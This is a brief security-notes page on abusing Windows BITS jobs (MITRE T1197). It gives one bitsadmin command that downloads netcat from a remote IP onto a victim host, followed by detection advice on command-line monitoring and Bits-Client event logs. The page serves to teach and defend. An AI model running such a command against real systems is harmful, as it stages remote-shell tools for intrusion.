# BITS Jobs

## BITS Jobs

### Execution

{% code title="attacker\@victim" %}
```c
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIIDan7GAEGwI-lmGs7%2F-LIIE2v7H5sGYQO7l9PB%2Fbits-download.png?alt=media\&token=1c13bbd5-1087-486f-a660-70f917374edc)

### Observations

Commandline arguments monitoring can help discover bitsadmin usage:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIIDan7GAEGwI-lmGs7%2F-LIIE7XGZgY-lS5y1ja4%2Fbits-cmdline.png?alt=media\&token=99d42147-923a-4387-9582-e287cd1721c4)

`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIIFFhUwxxP7bJKzZWf%2F-LIIG9BKGxsQX8C_E3Ra%2Fbits-operational-logs.png?alt=media\&token=2a92a8ee-295c-4b47-ba36-82fd8601c137)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1197" %}
